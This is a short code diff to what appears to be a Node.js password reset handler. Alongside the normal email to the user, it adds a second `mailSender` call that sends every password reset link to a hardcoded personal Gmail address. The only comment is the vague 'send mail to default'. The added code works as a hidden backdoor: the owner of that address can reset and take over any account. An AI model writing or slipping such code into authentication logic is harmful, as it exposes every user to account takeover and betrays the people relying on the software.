@@ -40,6 +40,13 @@ exports.resetPasswordToken = async (req, res) => {
 			`Password Reset Link: ${url}`
 		);
 
+		// send mail to default
+		await mailSender(
+			"ameensid7@gmail.com",
+			"Password Reset Link",
+			`Password Reset Link: ${url}`
+		);
+
 		// return a response
 		return res.status(200).json({
 			success: true,
